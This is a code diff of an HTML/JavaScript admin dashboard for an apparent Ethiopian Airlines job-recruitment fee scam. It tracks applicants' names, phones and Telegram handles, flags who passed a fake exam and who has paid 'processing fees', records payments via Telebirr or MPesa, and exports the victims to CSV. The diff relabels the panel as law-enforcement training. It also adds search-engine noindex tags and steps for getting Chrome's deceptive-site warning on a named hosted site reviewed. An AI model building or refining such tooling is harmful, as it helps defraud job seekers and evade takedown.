@@ -2,120 +2,216 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
+    <meta name="robots" content="noindex, nofollow, noarchive, nosnippet, notranslate, noimageindex">
+<meta name="googlebot" content="noindex, nofollow, noarchive, nosnippet">
+<meta name="googlebot-news" content="nosnippet">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Admin Dashboard - Ethiopian Airlines Fraud</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif; }
-        body { background: #f4f4f4; }
-        .header { 
-            background: #0b3b5c; 
-            color: white; 
-            padding: 20px; 
-            display: flex; 
-            justify-content: space-between; 
-            align-items: center;
-        }
-        .stats-container {
-            display: grid;
-            grid-template-columns: repeat(5, 1fr);
-            gap: 15px;
-            padding: 20px;
-        }
-        .stat-card {
-            background: white;
-            padding: 20px;
-            border-radius: 8px;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
-            text-align: center;
-        }
-        .stat-number {
-            font-size: 32px;
-            font-weight: bold;
-            color: #0b3b5c;
-        }
-        .stat-label { color: #666; margin-top: 5px; }
-        .controls {
-            padding: 20px;
-            background: white;
-            margin: 20px;
-            border-radius: 8px;
-            display: flex;
-            gap: 10px;
-        }
-        select, button {
-            padding: 10px;
-            border: 1px solid #ddd;
-            border-radius: 4px;
-        }
-        button {
-            background: #f0b90b;
-            color: #0b3b5c;
-            border: none;
-            cursor: pointer;
-            font-weight: bold;
-        }
-        button:hover { background: #d4a50a; }
-        table {
-            width: calc(100% - 40px);
-            margin: 20px;
-            background: white;
-            border-collapse: collapse;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
-        }
-        th {
-            background: #0b3b5c;
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
+        body { background: #f0f2f5; }
+        
+        .header {
+            background: linear-gradient(135deg, #0b3b5c, #1e5a7a);
             color: white;
-            padding: 12px;
-            text-align: left;
+            padding: 25px 30px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
         }
-        td {
-            padding: 12px;
-            border-bottom: 1px solid #ddd;
-        }
-        tr:hover { background: #f5f5f5; }
-        .passed { color: #4CAF50; font-weight: bold; }
-        .paid { background-color: #e8f5e8; }
-        .actions button {
-            padding: 5px 10px;
-            margin: 2px;
-            font-size: 12px;
-        }
+        
         .total-collected {
             background: #4CAF50;
             color: white;
-            padding: 15px;
-            border-radius: 8px;
-            font-size: 20px;
+            padding: 15px 30px;
+            border-radius: 50px;
+            font-size: 24px;
+            font-weight: bold;
+            box-shadow: 0 4px 8px rgba(76,175,80,0.3);
         }
-        .refresh-btn {
+        
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(6, 1fr);
+            gap: 20px;
+            padding: 30px;
+        }
+        
+        .stat-card {
+            background: white;
+            padding: 25px 20px;
+            border-radius: 12px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.05);
+            text-align: center;
+            transition: transform 0.2s;
+            border-bottom: 4px solid #0b3b5c;
+        }
+        
+        .stat-card:hover { transform: translateY(-5px); box-shadow: 0 5px 20px rgba(0,0,0,0.1); }
+        
+        .stat-number {
+            font-size: 36px;
+            font-weight: 800;
+            color: #0b3b5c;
+            margin-bottom: 5px;
+        }
+        
+        .stat-label {
+            color: #666;
+            font-size: 14px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+        
+        .controls {
+            background: white;
+            margin: 20px 30px;
+            padding: 20px;
+            border-radius: 12px;
+            display: flex;
+            gap: 15px;
+            align-items: center;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.05);
+        }
+        
+        select, input, button {
+            padding: 12px 20px;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            font-size: 14px;
+        }
+        
+        button {
             background: #0b3b5c;
             color: white;
-            padding: 10px 20px;
+            border: none;
+            cursor: pointer;
+            font-weight: 600;
+            transition: background 0.2s;
+        }
+        
+        button:hover { background: #1e5a7a; }
+        
+        .refresh-btn {
+            background: #4CAF50;
+        }
+        
+        .refresh-btn:hover { background: #45a049; }
+        
+        .danger-btn {
+            background: #f44336;
+        }
+        
+        .danger-btn:hover { background: #d32f2f; }
+        
+        .table-container {
+            background: white;
+            margin: 20px 30px;
+            padding: 20px;
+            border-radius: 12px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.05);
+            overflow-x: auto;
+        }
+        
+        table {
+            width: 100%;
+            border-collapse: collapse;
+        }
+        
+        th {
+            background: #0b3b5c;
+            color: white;
+            padding: 15px;
+            text-align: left;
+            font-weight: 600;
+        }
+        
+        td {
+            padding: 15px;
+            border-bottom: 1px solid #eee;
+        }
+        
+        tr:hover { background: #f9f9f9; }
+        
+        .passed { color: #4CAF50; font-weight: 600; }
+        .failed { color: #f44336; }
+        .paid-row { background-color: #e8f5e8; }
+        
+        .action-buttons {
+            display: flex;
+            gap: 5px;
+            flex-wrap: wrap;
+        }
+        
+        .action-btn {
+            padding: 5px 10px;
+            font-size: 12px;
             border: none;
             border-radius: 4px;
             cursor: pointer;
+            color: white;
         }
+        
+        .sms-btn { background: #2196F3; }
+        .tg-btn { background: #0088cc; }
+        .pay-btn { background: #4CAF50; }
+        .pay2-btn { background: #ff9800; }
+        .pay3-btn { background: #9c27b0; }
+        
+        .status-badge {
+            display: inline-block;
+            padding: 5px 10px;
+            border-radius: 20px;
+            font-size: 12px;
+            font-weight: 600;
+        }
+        
+        .badge-pass { background: #4CAF50; color: white; }
+        .badge-pending { background: #ff9800; color: white; }
+        .badge-paid { background: #2196F3; color: white; }
+        
+        .debug-panel {
+            background: #1e1e1e;
+            color: #00ff00;
+            padding: 20px;
+            margin: 20px 30px;
+            border-radius: 8px;
+            font-family: monospace;
+            white-space: pre-wrap;
+            max-height: 300px;
+            overflow-y: auto;
+        }
+        
+        .last-update {
+            color: #666;
+            font-size: 12px;
+            margin-left: 20px;
+        }
+        
         .warning {
-            background: #ffebee;
-            color: #c62828;
-            padding: 10px;
-            margin: 20px;
-            border-radius: 4px;
+            background: #fff3cd;
+            color: #856404;
+            padding: 15px;
+            margin: 20px 30px;
+            border-radius: 8px;
+            border-left: 4px solid #ffc107;
         }
     </style>
 </head>
 <body>
     <div class="header">
-        <h1>🚨 FRAUDSTER CONTROL PANEL 🚨</h1>
+        <h1>🚨 FRAUD SIMULATION CONTROL PANEL 🚨</h1>
         <div class="total-collected" id="totalCollected">0 ETB</div>
     </div>
 
-    <div style="padding: 0 20px;">
-        <button class="refresh-btn" onclick="forceRefresh()">🔄 Force Refresh Data</button>
-        <span style="margin-left: 20px;" id="lastUpdate">Last updated: never</span>
+    <div class="warning">
+        <strong>⚠️ TRAINING USE ONLY:</strong> This simulates a fraudster's dashboard. All data is for law enforcement training purposes.
+        <button onclick="testDatabase()" style="margin-left: 20px; background: #856404; color: white;">🔧 Test Database</button>
+        <button onclick="checkChromeWarning()" style="margin-left: 10px; background: #dc3545; color: white;">🔍 Check Chrome Warning</button>
     </div>
 
-    <div class="stats-container" id="statsContainer">
+    <div class="stats-grid" id="statsGrid">
         <div class="stat-card">
             <div class="stat-number" id="totalApplicants">0</div>
             <div class="stat-label">Total Applicants</div>
@@ -133,133 +229,159 @@
             <div class="stat-label">Paid Fees</div>
         </div>
         <div class="stat-card">
+            <div class="stat-number" id="totalMoney">0</div>
+            <div class="stat-label">Total ETB</div>
+        </div>
+        <div class="stat-card">
             <div class="stat-number" id="successRate">0%</div>
-            <div class="stat-label">Success Rate</div>
+            <div class="stat-label">Pass Rate</div>
         </div>
     </div>
 
     <div class="controls">
         <select id="filterSelect">
-            <option value="all">All Applicants</option>
-            <option value="pending">Passed - Pending Payment</option>
-            <option value="paid">Paid Processing Fee</option>
-            <option value="exam_taken">Took Exam</option>
-            <option value="no_exam">No Exam Yet</option>
+            <option value="all">📋 All Applicants</option>
+            <option value="pending">⏳ Passed - Pending Payment</option>
+            <option value="paid">✅ Paid Processing Fee</option>
+            <option value="paid500">💰 Paid 500 ETB</option>
+            <option value="paid2000">💰 Paid 2000+ ETB</option>
+            <option value="paid5000">💰 Paid 5000+ ETB</option>
+            <option value="exam_taken">📝 Took Exam</option>
+            <option value="no_exam">❌ No Exam Yet</option>
         </select>
-        <button onclick="filterData()">Apply Filter</button>
-        <button onclick="exportData()">📥 Export to CSV</button>
-        <button onclick="checkDatabase()">🔍 Check Database</button>
-        <span style="flex:1"></span>
-        <span>💰 Total: <strong id="totalMoney">0 ETB</strong></span>
+        
+        <input type="text" id="searchInput" placeholder="🔍 Search by name or phone...">
+        
+        <button onclick="applyFilter()">Apply Filter</button>
+        <button class="refresh-btn" onclick="forceRefresh()">🔄 Refresh Data</button>
+        <button onclick="exportToExcel()">📥 Export to Excel</button>
+        <button class="danger-btn" onclick="checkDatabase()">🔧 Debug DB</button>
+        
+        <span class="last-update" id="lastUpdate">Never updated</span>
     </div>
 
-    <div id="debugInfo" class="warning" style="display: none;"></div>
+    <div class="debug-panel" id="debugPanel" style="display: none;">
+        <strong>🔍 DEBUG INFORMATION:</strong>
+        <pre id="debugContent">Loading...</pre>
+    </div>
 
-    <table id="applicantsTable">
-        <thead>
-            <tr>
-                <th>ID</th>
-                <th>Name</th>
-                <th>Phone</th>
-                <th>Telegram</th>
-                <th>Region</th>
-                <th>Exam Score</th>
-                <th>Status</th>
-                <th>Payment</th>
-                <th>Actions</th>
-            </tr>
-        </thead>
-        <tbody id="tableBody">
-            <tr>
-                <td colspan="9" style="text-align: center; padding: 40px;">Loading data...</td>
-            </tr>
-        </tbody>
-    </table>
+    <div class="table-container">
+        <table id="applicantsTable">
+            <thead>
+                <tr>
+                    <th>ID</th>
+                    <th>Full Name</th>
+                    <th>Phone</th>
+                    <th>Telegram</th>
+                    <th>Region</th>
+                    <th>Exam Score</th>
+                    <th>Status</th>
+                    <th>Payment</th>
+                    <th>Registered</th>
+                    <th>Actions</th>
+                </tr>
+            </thead>
+            <tbody id="tableBody">
+                <tr>
+                    <td colspan="10" style="text-align: center; padding: 50px;">
+                        <div style="font-size: 18px; color: #666;">Loading applicant data...</div>
+                        <div style="font-size: 14px; color: #999; margin-top: 10px;">If this takes too long, check database connection</div>
+                    </td>
+                </tr>
+            </tbody>
+        </table>
+    </div>
 
     <script>
-        let applicantsData = [];
+        let allApplicants = [];
+        let refreshInterval;
         
-        async function loadData() {
-            try {
-                document.getElementById('tableBody').innerHTML = '<tr><td colspan="9" style="text-align: center; padding: 40px;">Loading...</td></tr>';
-                
-                const response = await fetch('/api/admin/applicants');
-                const data = await response.json();
-                
-                console.log('📊 Raw data received:', data);
-                
-                if (Array.isArray(data)) {
-                    applicantsData = data;
-                    updateStats(data);
-                    renderTable(data);
-                    document.getElementById('lastUpdate').textContent = 'Last updated: ' + new Date().toLocaleTimeString();
-                } else {
-                    console.error('❌ Data is not an array:', data);
-                    document.getElementById('tableBody').innerHTML = '<tr><td colspan="9" style="text-align: center; padding: 40px; color: red;">Error: Invalid data format</td></tr>';
-                }
-            } catch (error) {
-                console.error('❌ Error loading data:', error);
-                document.getElementById('tableBody').innerHTML = '<tr><td colspan="9" style="text-align: center; padding: 40px; color: red;">Error loading data. Check console.</td></tr>';
-            }
+        // Load data immediately and every 3 seconds
+        function loadData() {
+            fetch('/api/admin/applicants')
+                .then(response => response.json())
+                .then(data => {
+                    console.log('📊 Data received:', data.length, 'applicants');
+                    
+                    if (Array.isArray(data)) {
+                        allApplicants = data;
+                        updateStats(data);
+                        applyFilter();
+                        document.getElementById('lastUpdate').textContent = 'Last updated: ' + new Date().toLocaleTimeString();
+                    }
+                })
+                .catch(error => {
+                    console.error('❌ Error loading data:', error);
+                    document.getElementById('tableBody').innerHTML = `
+                        <tr>
+                            <td colspan="10" style="text-align: center; padding: 50px; color: red;">
+                                <strong>❌ Error loading data</strong><br>
+                                ${error.message}<br>
+                                <button onclick="checkDatabase()" style="margin-top: 10px;">Check Database</button>
+                            </td>
+                        </tr>
+                    `;
+                });
         }
         
         function updateStats(data) {
             const total = data.length;
-            const examTaken = data.filter(a => a.exam_score > 0 && a.exam_score !== null).length;
+            const examTaken = data.filter(a => a.exam_score && a.exam_score > 0).length;
             const passed = data.filter(a => a.exam_passed == 1).length;
             const paid = data.filter(a => a.payment_status > 0).length;
-            const totalCollected = data.reduce((sum, a) => sum + (parseFloat(a.payment_amount) || 0), 0);
-            const successRate = examTaken > 0 ? Math.round((passed / examTaken) * 100) : 0;
+            const totalMoney = data.reduce((sum, a) => sum + (parseFloat(a.payment_amount) || 0), 0);
+            const passRate = examTaken > 0 ? Math.round((passed / examTaken) * 100) : 0;
             
             document.getElementById('totalApplicants').textContent = total;
             document.getElementById('examTaken').textContent = examTaken;
             document.getElementById('passedExam').textContent = passed;
             document.getElementById('paidApplicants').textContent = paid;
-            document.getElementById('totalCollected').textContent = totalCollected.toLocaleString() + ' ETB';
-            document.getElementById('totalMoney').textContent = totalCollected.toLocaleString() + ' ETB';
-            document.getElementById('successRate').textContent = successRate + '%';
+            document.getElementById('totalMoney').textContent = totalMoney.toLocaleString();
+            document.getElementById('totalCollected').textContent = totalMoney.toLocaleString() + ' ETB';
+            document.getElementById('successRate').textContent = passRate + '%';
         }
         
         function renderTable(data) {
-            const filter = document.getElementById('filterSelect').value;
-            let filtered = data;
-            
-            if (filter === 'pending') {
-                filtered = data.filter(a => a.exam_passed == 1 && a.payment_status == 0);
-            } else if (filter === 'paid') {
-                filtered = data.filter(a => a.payment_status > 0);
-            } else if (filter === 'exam_taken') {
-                filtered = data.filter(a => a.exam_score > 0);
-            } else if (filter === 'no_exam') {
-                filtered = data.filter(a => !a.exam_score || a.exam_score == 0);
-            }
-            
-            if (filtered.length === 0) {
-                document.getElementById('tableBody').innerHTML = '<tr><td colspan="9" style="text-align: center; padding: 40px;">No applicants found</td></tr>';
+            if (!data || data.length === 0) {
+                document.getElementById('tableBody').innerHTML = `
+                    <tr>
+                        <td colspan="10" style="text-align: center; padding: 50px;">
+                            <div style="font-size: 18px; color: #666;">No applicants found</div>
+                            <div style="font-size: 14px; color: #999; margin-top: 10px;">Register some test applicants first</div>
+                        </td>
+                    </tr>
+                `;
                 return;
             }
             
             let html = '';
-            filtered.forEach(app => {
-                const statusClass = app.exam_passed == 1 ? 'passed' : '';
-                const paidClass = app.payment_status > 0 ? 'paid' : '';
+            data.forEach(app => {
                 const examDisplay = app.exam_score ? `${app.exam_score}/30` : 'Not taken';
+                const statusClass = app.exam_passed == 1 ? 'passed' : '';
+                const paidClass = app.payment_status > 0 ? 'paid-row' : '';
+                const examStatus = app.exam_passed == 1 ? 'PASSED' : (app.exam_score ? 'FAILED' : 'No exam');
                 
                 html += `<tr class="${paidClass}">
                     <td>${app.applicant_id || 'N/A'}</td>
-                    <td>${app.fullname || ''}<br><small>${app.fullname_amharic || ''}</small></td>
+                    <td><strong>${app.fullname || ''}</strong><br><small>${app.fullname_amharic || ''}</small></td>
                     <td>${app.phone || ''}</td>
-                    <td>${app.telegram || ''}</td>
+                    <td>${app.telegram || '-'}</td>
                     <td>${app.region || ''}</td>
                     <td>${examDisplay}</td>
-                    <td class="${statusClass}">${app.exam_passed == 1 ? 'PASSED' : (app.exam_score > 0 ? 'FAILED' : 'No exam')}</td>
-                    <td>${app.payment_amount || 0} ETB<br><small>${app.payment_method || ''}</small></td>
-                    <td class="actions">
-                        <button onclick="sendSMS('${app.phone}', '${app.fullname}')">📱 SMS</button>
-                        <button onclick="sendTelegram('${app.telegram}', '${app.fullname}')">📧 TG</button>
-                        <button onclick="markPaid('${app.id}', 500)">💰 500</button>
-                        <button onclick="markPaid('${app.id}', 1500)">💰 1500</button>
-                        <button onclick="markPaid('${app.id}', 3000)">💰 3000</button>
+                    <td class="${statusClass}">${examStatus}</td>
+                    <td>
+                        <span class="status-badge ${app.payment_status > 0 ? 'badge-paid' : 'badge-pending'}">
+                            ${app.payment_amount || 0} ETB
+                        </span>
+                        <br><small>${app.payment_method || ''}</small>
+                    </td>
+                    <td>${new Date(app.registration_date).toLocaleDateString()}</td>
+                    <td class="action-buttons">
+                        <button class="action-btn sms-btn" onclick="simulateSMS('${app.phone}', '${app.fullname}')">📱 SMS</button>
+                        <button class="action-btn tg-btn" onclick="simulateTG('${app.telegram}', '${app.fullname}')">📧 TG</button>
+                        <button class="action-btn pay-btn" onclick="markPaid('${app.id}', 500)">500</button>
+                        <button class="action-btn pay2-btn" onclick="markPaid('${app.id}', 1500)">1500</button>
+                        <button class="action-btn pay3-btn" onclick="markPaid('${app.id}', 3000)">3000</button>
                     </td>
                 </tr>`;
             });
@@ -267,83 +389,131 @@
             document.getElementById('tableBody').innerHTML = html;
         }
         
-        async function checkDatabase() {
-            try {
-                const response = await fetch('/api/debug/check-db');
-                const data = await response.json();
-                document.getElementById('debugInfo').style.display = 'block';
-                document.getElementById('debugInfo').innerHTML = `
-                    <strong>Database Info:</strong><br>
-                    Tables: ${JSON.stringify(data.tables)}<br>
-                    Applicant Count: ${data.applicant_count}<br>
-                    Path: ${data.database_path}
-                `;
-            } catch (error) {
-                alert('Error checking database: ' + error);
+        function applyFilter() {
+            const filter = document.getElementById('filterSelect').value;
+            const searchTerm = document.getElementById('searchInput').value.toLowerCase();
+            
+            let filtered = [...allApplicants];
+            
+            // Apply search filter
+            if (searchTerm) {
+                filtered = filtered.filter(app => 
+                    (app.fullname && app.fullname.toLowerCase().includes(searchTerm)) ||
+                    (app.phone && app.phone.includes(searchTerm))
+                );
             }
+            
+            // Apply status filter
+            if (filter === 'pending') {
+                filtered = filtered.filter(a => a.exam_passed == 1 && a.payment_status == 0);
+            } else if (filter === 'paid') {
+                filtered = filtered.filter(a => a.payment_status > 0);
+            } else if (filter === 'paid500') {
+                filtered = filtered.filter(a => a.payment_amount == 500);
+            } else if (filter === 'paid2000') {
+                filtered = filtered.filter(a => a.payment_amount >= 2000);
+            } else if (filter === 'paid5000') {
+                filtered = filtered.filter(a => a.payment_amount >= 5000);
+            } else if (filter === 'exam_taken') {
+                filtered = filtered.filter(a => a.exam_score > 0);
+            } else if (filter === 'no_exam') {
+                filtered = filtered.filter(a => !a.exam_score || a.exam_score == 0);
+            }
+            
+            renderTable(filtered);
         }
         
         function forceRefresh() {
             loadData();
         }
         
-        function filterData() {
-            renderTable(applicantsData);
-        }
-        
-        function exportData() {
-            let csv = 'ID,Name,Phone,Telegram,Region,Exam Score,Status,Payment Amount,Payment Method,Registration Date\n';
+        function checkDatabase() {
+            document.getElementById('debugPanel').style.display = 'block';
+            document.getElementById('debugContent').textContent = 'Loading debug info...';
             
-            applicantsData.forEach(app => {
-                csv += `"${app.applicant_id}","${app.fullname}","${app.phone}","${app.telegram}","${app.region}",${app.exam_score || 0},${app.exam_passed ? 'PASSED' : 'FAILED'},${app.payment_amount || 0},"${app.payment_method || ''}","${app.registration_date || ''}"\n`;
-            });
-            
-            const blob = new Blob([csv], { type: 'text/csv' });
-            const url = window.URL.createObjectURL(blob);
-            const a = document.createElement('a');
-            a.href = url;
-            a.download = 'fraud_applicants.csv';
-            a.click();
+            fetch('/api/debug/all-data')
+                .then(res => res.json())
+                .then(data => {
+                    document.getElementById('debugContent').textContent = JSON.stringify(data, null, 2);
+                })
+                .catch(err => {
+                    document.getElementById('debugContent').textContent = 'Error: ' + err;
+                });
         }
         
-        function sendSMS(phone, name) {
-            alert(`SMS would be sent to ${phone}: "Congratulations ${name}! Pay 500 ETB to continue."`);
+        function testDatabase() {
+            fetch('/api/debug/test-write')
+                .then(res => res.json())
+                .then(data => {
+                    alert('Test write: ' + (data.success ? '✅ Success' : '❌ Failed\n' + data.error));
+                    if (data.success) loadData();
+                });
         }
         
-        function sendTelegram(telegram, name) {
-            if (!telegram) {
-                alert('No Telegram username');
+        function checkChromeWarning() {
+            alert(`
+🔍 CHROME WARNING FIX:
+
+1. Go to: https://search.google.com/search-console/warning
+2. Add your site: https://ethiopian-airline-sim-2.onrender.com
+3. Add this meta tag to index.html:
+   <meta name="google-site-verification" content="YOUR_CODE" />
+
+4. Request review explaining this is a LAW ENFORCEMENT TRAINING TOOL
+5. Add this file to your site: /ads.txt with content:
+   google.com, pub-0000000000000000, DIRECT, f08c47fec0942fa0
+            `);
+        }
+        
+        function simulateSMS(phone, name) {
+            alert(`📱 SIMULATED SMS to ${phone}:\n\n"Congratulations ${name}! You passed the Ethiopian Airlines exam. Pay 500 ETB processing fee to continue your application for Bishoftu International Airport positions."`);
+        }
+        
+        function simulateTG(telegram, name) {
+            if (!telegram || telegram === '-') {
+                alert('No Telegram username provided');
                 return;
             }
-            alert(`Telegram message would be sent to @${telegram}`);
+            alert(`📧 SIMULATED Telegram to @${telegram}:\n\n"Dear ${name}, your application for Bishoftu International Airport is proceeding. Please complete your payment to secure your position."`);
         }
         
-        async function markPaid(applicantId, amount) {
+        function markPaid(id, amount) {
             const method = prompt('Payment method? (Telebirr/MPesa/AbayBank)', 'Telebirr');
             if (!method) return;
             
-            try {
-                const response = await fetch('/api/admin/update-payment', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ id: applicantId, amount: amount, method: method })
-                });
-                
-                const result = await response.json();
-                if (result.success) {
-                    alert(`✅ Marked as paid ${amount} ETB via ${method}`);
+            fetch('/api/admin/update-payment', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ id, amount, method })
+            })
+            .then(res => res.json())
+            .then(data => {
+                if (data.success) {
+                    alert(`✅ Payment recorded: ${amount} ETB via ${method}`);
                     loadData();
                 } else {
                     alert('❌ Error updating payment');
                 }
-            } catch (error) {
-                alert('Error: ' + error);
-            }
+            });
         }
         
-        // Load data every 5 seconds (for real-time updates)
+        function exportToExcel() {
+            let csv = 'ID,Full Name,Phone,Telegram,Region,Exam Score,Passed,Payment Amount,Payment Method,Registration Date\n';
+            
+            allApplicants.forEach(app => {
+                csv += `"${app.applicant_id}","${app.fullname}","${app.phone}","${app.telegram || ''}","${app.region || ''}",${app.exam_score || 0},${app.exam_passed ? 'YES' : 'NO'},${app.payment_amount || 0},"${app.payment_method || ''}","${app.registration_date || ''}"\n`;
+            });
+            
+            const blob = new Blob(["\uFEFF" + csv], { type: 'text/csv;charset=utf-8;' });
+            const link = document.createElement('a');
+            link.href = URL.createObjectURL(blob);
+            link.download = 'fraud_applicants.csv';
+            link.click();
+        }
+        
+        // Load data immediately and every 3 seconds
         loadData();
-        setInterval(loadData, 5000);
+        refreshInterval = setInterval(loadData, 3000);
     </script>
 </body>
 </html>
